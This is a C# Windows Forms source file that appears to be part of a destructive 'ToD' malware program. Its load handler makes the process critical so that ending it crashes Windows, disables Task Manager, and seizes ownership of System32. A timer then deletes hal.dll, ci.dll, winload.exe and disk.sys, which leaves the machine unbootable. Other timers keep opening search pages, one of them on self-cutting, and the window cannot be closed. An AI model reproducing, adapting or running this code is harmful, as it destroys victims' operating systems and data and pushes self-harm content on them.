﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Diagnostics;
using System.Runtime.InteropServices;
using Microsoft.Win32;
using System.IO;

namespace ToD
{
    public partial class Form2 : Form
    {
        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
        public Form2()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
            TopMost = true;
            r = new Random();
        }
        Random r;
        private void Form2_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }

        private void Form2_Load(object sender, EventArgs e)
        {
            int isCritical = 1;  // we want this to be a Critical Process
            int BreakOnTermination = 0x1D;  // value for BreakOnTermination (flag)

            Process.EnterDebugMode();  //acquire Debug Privileges

            // setting the BreakOnTermination = 1 for the current process
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
            RegistryKey rk = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            rk.SetValue("DisableTaskMgr", 1, RegistryValueKind.String); // turn off task manager

            //get system32 folder and drivers
            new Process() { StartInfo = new ProcessStartInfo("cmd.exe", @"/k color 47 && takeown /f C:\Windows\System32 && icacls C:\Windows\System32 /grant %username%:F && takeown /f C:\Windows\System32\drivers && icacls C:\Windows\System32\drivers /grant %username%:F && Exit") }.Start();
            tmr1.Start();
            tmr_add.Start();
            tmr_next_payload.Start();
        }

        private void tmr1_Tick(object sender, EventArgs e)
        {
            tmr1.Stop();
            //Path sys files and folders
            string hal_dll = @"C:\Windows\System32\hal.dll";
            string ci_dll = @"C:\Windows\System32\ci.dll";
            string winload_exe = @"C:\Windows\System32\winload.exe";
            string disk_sys = @"C:\Windows\System32\drivers\disk.sys";

            //Delete system files
            if (File.Exists(hal_dll))
            {
                File.Delete(hal_dll);
            }

            if (File.Exists(ci_dll))
            {
                File.Delete(ci_dll);
            }

            if (File.Exists(winload_exe))
            {
                File.Delete(winload_exe);
            }

            if (File.Exists(disk_sys))
            {
                File.Delete(disk_sys);
            }
        }

        private void tmr_add_Tick(object sender, EventArgs e)
        {
            tmr_add.Stop();
            int true_num = r.Next(5); //make random num 1-5

            if (true_num == 1)
            {
                System.Diagnostics.Process.Start("https://www.google.de/search?q=how+to+crash+a+computor&sxsrf=ALeKk03i59n1x63Y3DXoaAJD9bZjEZaG6Q%3A1622890444983&source=hp&ei=zFe7YIu5OOb87_UPjaSKmAo&iflsig=AINFCbYAAAAAYLtl3FnG3jdfu3aDFQDGwzXkOkFSSf8c&oq=how+to+crash+a+computor&gs_lcp=Cgdnd3Mtd2l6EAMyBAgAEA0yBggAEA0QHjIGCAAQDRAeMgYIABANEB4yBggAEA0QHjIGCAAQDRAeMgYIABANEB4yBggAEA0QHjIGCAAQDRAeMgYIABANEB5Q7Q5Y7Q5goBFoAHAAeACAAYABiAGAAZIBAzAuMZgBAKABAqABAaoBB2d3cy13aXo&sclient=gws-wiz&ved=0ahUKEwiLz-qDqoDxAhVm_rsIHQ2SAqMQ4dUDCAg&uact=5");
            }

            if (true_num == 2)
            {
                System.Diagnostics.Process.Start("https://www.google.de/search?q=delete+system+32&sxsrf=ALeKk03wz7SqJHlBOgwS0MReFEmVujx3rQ%3A1622890447511&ei=z1e7YIbAHtyN9u8PrYyt-AQ&oq=delete+system+32&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEMsBMgIIADIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBOgcIABBHELADOgsIABCxAxDHARCjAjoFCAAQsQM6CAgAELEDEIMBOgQIIxAnOgYIIxAnEBM6CAgAELEDEIsDOgsIABCxAxCDARCLAzoCCC46CAguELEDEJMCOgUILhCxAzoHCAAQAxCLAzoGCAAQFhAeUMDzJliPtSdgmbsnaAJwAXgAgAGjAYgBgA2SAQQxNC40mAEAoAEBqgEHZ3dzLXdpesgBCLgBAsABAQ&sclient=gws-wiz&ved=0ahUKEwjG44eFqoDxAhXchv0HHS1GC08Q4dUDCA0&uact=5");
            }

            if (true_num == 3)
            {
                System.Diagnostics.Process.Start("https://www.google.de/search?q=how+to+hack&sxsrf=ALeKk01KMDuSQEnC15YQd-dzz16JlZoIkg%3A1622891093852&ei=VVq7YJj4Ms6M9u8PsvW7qAo&oq=how+to+hack&gs_lcp=Cgdnd3Mtd2l6EAMyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBMgUIABDLATIFCAAQywEyBQgAEMsBOgcIABBHELADOgcIABCwAxBDOgoILhCwAxDIAxBDOgQIIxAnOgQIABBDOggIABDHARCvAToLCAAQsQMQxwEQowI6CAgAELEDEIMBOgQILhBDOggIABCxAxCLAzoLCAAQsQMQgwEQiwM6BQguELEDOgIILjoICC4QsQMQiwM6BQgAEIsDOgIIADoHCAAQhwIQFDoECAAQDUoFCDgSATFQ-eoBWOidAmC0nwJoBnACeACAAasBiAGZCpIBBDEwLjOYAQCgAQGqAQdnd3Mtd2l6yAELuAECwAEB&sclient=gws-wiz&ved=0ahUKEwjY9qC5rIDxAhVOhv0HHbL6DqUQ4dUDCA0&uact=5");
            }

            if (true_num == 4)
            {
                System.Diagnostics.Process.Start("https://www.google.com/search?sxsrf=ALeKk007atE4-A-mD40nsEcYaIJklYlv_g%3A1605092231197&ei=h8OrX5XEC4mdkwXO84XoAg&q=how+2+cut+leg&oq=how+2+cut+leg&gs_lcp=CgZwc3ktYWIQDDIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjIICCEQFhAdEB4yCAghEBYQHRAeMggIIRAWEB0QHjoJCCMQ6gIQJxATOgcIIxDqAhAnOgQIIxAnOgQIABBDOgUIABCxAzoKCAAQsQMQgwEQQzoCCC46CAguELEDEIMBOgIIADoFCC4QsQM6BQguEMsBOgUIABDLAToGCAAQFhAeOggIABAWEAoQHlDzaFiDigFg86UBaANwAHgAgAHzAYgB7w2SAQYwLjEyLjGYAQCgAQGqAQdnd3Mtd2l6sAEKwAEB&sclient=psy-ab&ved=0ahUKEwjVo5bCqvrsAhWJzqQKHc55AS0Q4dUDCA0");
            }

            if (true_num == 5)
            {
                System.Diagnostics.Process.Start("https://www.google.de/search?q=you+have+a+computor+virus&sxsrf=ALeKk03ivRoT4f6SEXqa1CFB4yjAhtN0Cg%3A1622891204721&ei=xFq7YPysK_CH9u8P1buJkAI&oq=you+have+a+computor+virus&gs_lcp=Cgdnd3Mtd2l6EAMyBwgjELACECcyBAgAEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBMyCAgAEBYQHhATMggIABAWEB4QEzIICAAQFhAeEBMyCAgAEBYQHhATMggIABAWEB4QEzoHCAAQRxCwAzoKCAAQDRAFEB4QE1DSH1iCOGC2WWgBcAF4AIABdYgBtgSSAQM2LjGYAQCgAQGqAQdnd3Mtd2l6yAEIwAEB&sclient=gws-wiz&ved=0ahUKEwj8npDurIDxAhXwg_0HHdVdAiIQ4dUDCA0&uact=5");
            }
            tmr_add.Start();
        }

        private void tmr_next_payload_Tick(object sender, EventArgs e)
        {
            tmr_next_payload.Stop();
            var NewForm = new Form3();
            NewForm.ShowDialog();
        }
    }
}
